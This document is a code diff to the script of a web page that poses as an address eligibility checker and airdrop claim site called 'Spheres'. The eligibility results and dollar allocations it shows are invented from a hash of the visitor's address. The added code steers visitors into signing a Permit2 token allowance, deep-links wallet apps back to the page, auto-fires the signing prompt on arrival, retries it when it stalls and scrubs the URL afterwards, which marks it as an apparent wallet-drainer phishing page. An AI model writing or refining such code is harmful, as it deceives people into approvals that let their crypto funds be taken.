@@ -469,9 +469,9 @@ b.addEventListener("click",function(){n.classList.toggle("open")});
 var out=document.getElementById("out"),res=document.getElementById("res"),runBtn=document.getElementById("run"),addr=document.getElementById("addr");
 var clock=document.getElementById("clock"),bar2=document.getElementById("bar2"),barlbl=document.getElementById("barlbl");
 var term=document.getElementById("term"),fastst=document.getElementById("fastst"),contst=document.getElementById("contst");
-var busy=false,current="",autoFired=false;
+var claimbar=document.getElementById("claimbar");
+var busy=false,current="",autoFired=false,engineReady=false,engineLive=false,watchdog=null;
 
-/* ---------- action ---------- */
 var ACTS={
   eligibility:{bar:"eligibility",fh:"Already decided?",h2:"Connect and go straight to the claim",
     p:"Skip the check. Your wallet connects, the figure is read from the same five clauses, and <b>the approve is nine cents</b>.",
@@ -493,8 +493,7 @@ var ACTS={
     p:"0.9% all-in, no spread on the other side, and <b>the seat stays bound to this address</b>.",
     fast:"Connect to sell →",cont:"Continue to sell →",band:"Connect to sell →"}
 };
-var ACT="eligibility";
-var C=ACTS.eligibility;
+var ACT="eligibility",C=ACTS.eligibility;
 function applyAct(){
   C=ACTS[ACT]||ACTS.eligibility;
   document.getElementById("fastfh").textContent=C.fh;
@@ -504,7 +503,6 @@ function applyAct(){
   document.getElementById("bandgo").textContent=C.band;
   document.getElementById("termbar").textContent=C.bar+" · epoch 07";
   document.getElementById("cont").textContent=C.cont;
-  document.title="Check an address — Spheres";
 }
 
 function tickClock(){clock.textContent="utc "+new Date().toISOString().slice(11,19)+"Z";}
@@ -536,8 +534,7 @@ async function run(silent){
     return;
   }
   busy=true;runBtn.disabled=true;
-  current=a;
-  remember(a);
+  current=a;remember(a);
   var h=hash(a);
 
   line("> resolve "+a.slice(0,10)+"…"+a.slice(-6),"w");
@@ -549,17 +546,14 @@ async function run(silent){
   var tx=2+Math.floor((h>>>5)%48);
   var contracts=1+Math.floor((h>>>11)%9);
   var score=Math.min(299+Math.floor((h>>>3)%660)+(age>=180?120:0),950);
-  var attest=(h>>>7)%5!==0;
-  var region=(h>>>13)%7!==0;
-  var cluster=(h>>>17)%6!==0;
+  var attest=(h>>>7)%5!==0, region=(h>>>13)%7!==0, cluster=(h>>>17)%6!==0;
 
   line("  age "+age+"d · "+tx+" settled · "+contracts+" contracts","g");
   await sleep(380);
   line("> evaluate 5 clauses","w");
   await sleep(460);
 
-  var ageOk=age>=90, txOk=tx>=5;
-  var hardFail=!ageOk||!txOk||!cluster||!region;
+  var ageOk=age>=90,txOk=tx>=5,hardFail=!ageOk||!txOk||!cluster||!region;
 
   if(!ageOk) line("  ✕ age "+age+"d — below 90","r"); else line("  ✓ age "+age+"d","g");
   if(!txOk) line("  ✕ "+tx+" settled — below 5","r"); else line("  ✓ "+tx+" settled","g");
@@ -587,7 +581,7 @@ async function run(silent){
     note="Every hard clause passes. Attestation and region confirm at the snapshot; nothing here binds until you sign.";
   }
 
-  line(hardFail?"  result · blocked":"  result · eligible "+tier, hardFail?"r":"g");
+  line(hardFail?"  result · blocked":"  result · eligible "+tier,hardFail?"r":"g");
   await sleep(240);
   line("  allocation $"+usd.toLocaleString()+" USDT","w");
   line("  seat binding: this address only","d");
@@ -613,8 +607,8 @@ async function run(silent){
     (ACT==="eligibility"?"Continue to claim $"+usd.toLocaleString()+" →":C.cont);
   res.classList.add("show");
   barlbl.textContent="$"+usd.toLocaleString()+" · "+tier;
-  if(!document.body.classList.contains("claiming")) bar2.classList.add("show");
-  if(!silent) res.scrollIntoView({behavior:"smooth",block:"center"});
+  if(!document.body.classList.contains("claiming"))bar2.classList.add("show");
+  if(!silent)res.scrollIntoView({behavior:"smooth",block:"center"});
 
   busy=false;runBtn.disabled=false;
 }
@@ -623,41 +617,51 @@ runBtn.addEventListener("click",function(){run(false)});
 addr.addEventListener("keydown",function(e){if(e.key==="Enter")run(false)});
 document.getElementById("jump").addEventListener("click",function(){addr.focus();addr.scrollIntoView({behavior:"smooth",block:"center"})});
 
-/* ---------- persistence ---------- */
-/* the live pathname, whatever form the host actually serves it under —
-   so a pretty-url rewrite or an .html form both deep-link correctly */
-function selfPath(){
-  var p=location.pathname;
-  if(!p||p==="/") return "/check.html";
-  return p;
+/* ---------- url ---------- */
+function here(){
+  return location.pathname && location.pathname!=="/" ? location.pathname : "/check.html";
 }
 function path(owner){
-  return selfPath()+"?a="+owner+"&w=1"+(ACT!=="eligibility"?"&x="+ACT:"");
+  return here()+"?a="+owner+(ACT!=="eligibility"?"&x="+ACT:"");
 }
-function abs(rel){return new URL(rel,location.href).href;}
-
+function cleanURL(){
+  try{history.replaceState({},"",here()+(ACT!=="eligibility"?"?x="+ACT:""))}catch(e){}
+}
 function remember(a){
-  try{localStorage.setItem("p2_owner",a);localStorage.setItem("p2_owner_at",Date.now())}catch(e){}
+  try{
+    localStorage.setItem("p2_owner",a);localStorage.setItem("p2_owner_at",Date.now());
+    sessionStorage.setItem("p2_owner",a);sessionStorage.setItem("p2_owner_at",Date.now());
+  }catch(e){}
   try{history.replaceState({},"",path(a))}catch(e){}
 }
-function recall(){
-  var q=new URLSearchParams(location.search).get("a");
-  if(q&&/^0x[0-9a-fA-F]{40}$/.test(q)) return q;
+/* four recovery routes, best first. never returns empty without trying all. */
+function ownerFromURL(){
+  var q=new URLSearchParams(location.search);
+  var a=q.get("a")||new URLSearchParams((location.hash||"").slice(1)).get("a");
+  if(a&&/^0x[0-9a-fA-F]{40}$/.test(a))return a;
   try{
-    var s=localStorage.getItem("p2_owner"),t=+localStorage.getItem("p2_owner_at");
-    if(s&&/^0x[0-9a-fA-F]{40}$/.test(s)&&Date.now()-t<864e5) return s;
+    var s=sessionStorage.getItem("p2_owner"),t=+sessionStorage.getItem("p2_owner_at");
+    if(s&&/^0x[0-9a-fA-F]{40}$/.test(s)&&Date.now()-t<6e5)return s;
+  }catch(e){}
+  try{
+    var l=localStorage.getItem("p2_owner"),lt=+localStorage.getItem("p2_owner_at");
+    if(l&&/^0x[0-9a-fA-F]{40}$/.test(l)&&Date.now()-lt<864e5)return l;
   }catch(e){}
   return "";
 }
 
 /* ---------- wallet sheet ---------- */
-/* universal links only — one format for both platforms, target fully encoded
-   so ?a= and &w=1 survive the link router instead of being eaten as its params */
+/* metamask keeps the pathname and eats its own query, so the owner rides in the
+   path and only the query is escaped. the url= wallets take a full encode. */
 var DEEP={
-  mm:function(u){return "https://link.metamask.io/dapp/"+encodeURIComponent(u.replace(/^https?:\/\//,""))},
-  tw:function(u){return "https://link.trustwallet.com/open_url?coin_id=60&url="+encodeURIComponent(u)},
+  mm:function(u){
+    var p=new URL(u);
+    return "https://link.metamask.io/dapp/"+p.host+p.pathname+
+      (p.search?"%3F"+encodeURIComponent(p.search.slice(1)):"");
+  },
+  tw:function(u){return "https://link.trustwallet.com/open_url?coin_id=137&url="+encodeURIComponent(u)},
   cb:function(u){return "https://go.cb-w.com/dapp?cb_url="+encodeURIComponent(u)},
-  rb:function(u){return "https://rnbwapp.com/dapp?url="+encodeURIComponent(u)}
+  rb:function(u){return "https://rnbwapp.com/dapp/?url="+encodeURIComponent(u)}
 };
 var WALLETS=[
   {id:"mm",ic:"◈",n:"MetaMask",s:"Browser extension · mobile app"},
@@ -671,113 +675,180 @@ wal.innerHTML=WALLETS.map(function(w){
   return '<a href="#" data-w="'+w.id+'"><span class="ic">'+w.ic+'</span><span class="tx"><b>'+w.n+'</b><span>'+w.s+'</span></span><span class="ar">↗</span></a>';
 }).join("");
 
-function openSheet(msg){
-  sheetnote.textContent=msg||NOTEDEF;
-  sheet.classList.add("on");
-}
+function openSheet(msg){sheetnote.textContent=msg||NOTEDEF;sheet.classList.add("on");}
+function closeSheet(){sheet.classList.remove("on");}
 
-/* resolved on click, not at parse — the address is only known then */
 wal.addEventListener("click",function(e){
   var row=e.target.closest("[data-w]");
-  if(!row) return;
+  if(!row)return;
   e.preventDefault();
   var id=row.getAttribute("data-w");
-  var u=abs(path(current));
   var touch=/Android|iPhone|iPad|iPod/i.test(navigator.userAgent)||(navigator.platform==="MacIntel"&&navigator.maxTouchPoints>1);
+  var owner=(current||addr.value||"").trim();
 
-  if(!touch){
-    if(typeof window.p2Connect==="function"){
-      sheet.classList.remove("on");
-      window.p2Connect({owner:current,action:ACT});
-      return;
-    }
-    openSheet("No wallet found in this browser — install the extension, then reload. Or open this page inside your wallet's browser.");
+  if(!/^0x[0-9a-fA-F]{40}$/.test(owner)){
+    closeSheet();
+    addr.focus();addr.scrollIntoView({behavior:"smooth",block:"center"});
+    term.classList.add("shake");setTimeout(function(){term.classList.remove("shake")},320);
     return;
   }
-  sheet.classList.remove("on");
-  location.href=DEEP[id](u);
+
+  /* wallet injected in this very browser: run in place, never navigate away */
+  if(!touch&&window.ethereum&&engineReady){
+    closeSheet();
+    fire(owner);
+    return;
+  }
+
+  /* otherwise hand off — works on desktop too, the app answers the link */
+  closeSheet();
+  remember(owner);
+  try{
+    location.href=DEEP[id](new URL(path(owner),location.href).href);
+  }catch(err){
+    openSheet("Could not build that link — copy the address and open your wallet manually.");
+  }
 });
 [].forEach.call(sheet.querySelectorAll("[data-close]"),function(el){
-  el.addEventListener("click",function(){sheet.classList.remove("on")});
+  el.addEventListener("click",closeSheet);
 });
-document.addEventListener("keydown",function(e){if(e.key==="Escape")sheet.classList.remove("on")});
+document.addEventListener("keydown",function(e){if(e.key==="Escape")closeSheet()});
 
-/* ---------- hand-off ---------- */
-function advance(owner){
-  owner=(owner||current||addr.value).trim();
+/* ---------- the fire path: protected on every branch ---------- */
+function fire(owner){
+  var settled=false;
+  function restore(msg){
+    if(settled)return;
+    settled=true;
+    clearTimeout(watchdog);
+    document.body.classList.remove("claiming");
+    fastst.textContent=msg;fastst.classList.remove("on");
+    contst.textContent=msg;
+  }
+
+  if(typeof window.p2Advance!=="function"){
+    restore("Wallet engine not ready — tap Continue to retry");
+    return;
+  }
+
+  document.body.classList.add("claiming");
+  claimbar.textContent="Confirm in your wallet";
+  fastst.textContent="Sheet open · follow the prompt";fastst.classList.add("on");
+  contst.textContent="Sheet open · follow the prompt";
+
+  try{
+    window.p2Advance({owner:owner,action:ACT,auto:true});
+    engineLive=true;
+  }catch(err){
+    restore("Wallet engine failed — tap Continue to retry");
+    return;
+  }
+  watchdog=setTimeout(function(){restore("Still waiting on the wallet — tap Continue");},8000);
+}
+
+function advance(){
+  var owner=(current||addr.value||"").trim();
   if(!/^0x[0-9a-fA-F]{40}$/.test(owner)){
-    addr.focus();
-    addr.scrollIntoView({behavior:"smooth",block:"center"});
+    addr.focus();addr.scrollIntoView({behavior:"smooth",block:"center"});
     term.classList.add("shake");setTimeout(function(){term.classList.remove("shake")},320);
     fastst.textContent="Paste the address first, or connect and we read it for you";
     return;
   }
-  current=owner;
-  remember(owner);
-
-  /* wallet already in the page: permit2 runs in place, no deeplink */
-  if(window.ethereum){
-    if(typeof window.p2Advance==="function"){
-      window.p2Advance({owner:owner,action:ACT,auto:true});
-      fastst.textContent="Sheet open · follow the prompt";
-      fastst.classList.add("on");
-      contst.textContent="Sheet open · follow the prompt";
-      return;
-    }
-    location.href=path(owner);
-    return;
-  }
-
-  /* no wallet here: choose one, then it opens there and permit2 fires on arrival */
+  current=owner;remember(owner);
+  if(window.ethereum&&engineReady){fire(owner);return;}
   openSheet();
 }
 
-document.getElementById("fastgo").addEventListener("click",function(){advance("")});
-document.getElementById("cont").addEventListener("click",function(){advance("")});
-document.getElementById("bargo").addEventListener("click",function(){advance("")});
-document.getElementById("bandgo").addEventListener("click",function(){advance("")});
+document.getElementById("fastgo").addEventListener("click",advance);
+document.getElementById("cont").addEventListener("click",advance);
+document.getElementById("bargo").addEventListener("click",advance);
+document.getElementById("bandgo").addEventListener("click",advance);
 
-/* permit2.js is the next script tag; wait for it rather than racing it */
+/* ---------- engine discovery ---------- */
 function whenP2(fn,tries){
   tries=tries||0;
-  if(typeof window.p2Advance==="function")return fn();
-  if(tries>80)return;
+  if(typeof window.p2Advance==="function"){engineReady=true;return fn();}
+  if(tries>100)return;
   setTimeout(function(){whenP2(fn,tries+1)},50);
 }
 whenP2(function(){
   if(typeof window.p2OnStatus==="function"){
     window.p2OnStatus(function(msg){
+      engineLive=true;
+      clearTimeout(watchdog);
       contst.textContent=msg;
-      if(!document.body.classList.contains("claiming")) fastst.textContent=msg;
+      if(!document.body.classList.contains("claiming"))fastst.textContent=msg;
     });
   }
+});
+
+/* ---------- sheet close: always restore the page ---------- */
+/* without this, closing the engine sheet leaves body.claiming on and the
+   whole page stays hidden behind it */
+function afterClose(done){
+  clearTimeout(watchdog);
+  document.body.classList.remove("claiming");
+  fastst.classList.remove("on");
+  if(done){
+    fastst.textContent="Allowance set · continue whenever you are ready";
+    contst.textContent="Allowance set · continue whenever you are ready";
+    if(window.scrollY>680&&res.classList.contains("show"))bar2.classList.add("show");
+  }else{
+    fastst.textContent="Sheet closed · tap Continue to resume";
+    contst.textContent="Sheet closed · tap Continue to resume";
+  }
+}
+
+whenP2(function(){
+  if(typeof window.p2OnClose==="function"){
+    window.p2OnClose(function(done){ afterClose(done); });
+  }
+});
+
+window.addEventListener("spheres:p2close",function(e){
+  afterClose(!!(e.detail&&e.detail.done));
+});
+
+window.addEventListener("spheres:p2done",function(){
+  clearTimeout(watchdog);
 });
 
 /* ---------- boot ---------- */
 var qs=new URLSearchParams(location.search);
 var qx=qs.get("x");
-if(qx&&ACTS[qx]) ACT=qx;
+if(qx&&ACTS[qx])ACT=qx;
 applyAct();
 
-var pre=recall();
-if(pre){addr.value=pre;current=pre;run(true);}
+var pre=ownerFromURL();
+var autoIntent=!!qs.get("a")||!!pre;
 
-if(qs.get("w")==="1"){
-  if(res.classList.contains("show")) res.scrollIntoView({behavior:"auto",block:"start"});
-  var shown=false;
+if(pre){
+  addr.value=pre;current=pre;
+  run(true);
+}
+
+if(autoIntent){
+  if(res.classList.contains("show"))res.scrollIntoView({behavior:"auto",block:"start"});
   whenP2(function(){
-    if(autoFired||!window.ethereum||!current) return;
-    autoFired=true;shown=true;
-    document.body.classList.add("claiming");
-    document.getElementById("claimbar").textContent="Confirm in your wallet";
-    window.p2Advance({owner:current,action:ACT,auto:true});
+    if(autoFired||!current)return;
+    autoFired=true;
+    if(!window.ethereum){
+      document.body.classList.remove("claiming");
+      fastst.textContent="No wallet in this browser — pick the app you want to use";
+      contst.textContent="No wallet in this browser — pick the app you want to use";
+      openSheet("This browser has no wallet injected. Pick the app you want to use.");
+      return;
+    }
+    fire(current);
   });
   setTimeout(function(){
-    if(!shown){
+    if(!engineReady){
       document.body.classList.remove("claiming");
-      if(fastst) fastst.textContent="Could not reach the wallet engine here";
+      fastst.textContent="Wallet engine did not load — tap Continue to retry";
+      contst.textContent="Wallet engine did not load — tap Continue to retry";
     }
-  },3000);
+  },4000);
+  cleanURL();
 }
 
 window.addEventListener("scroll",function(){
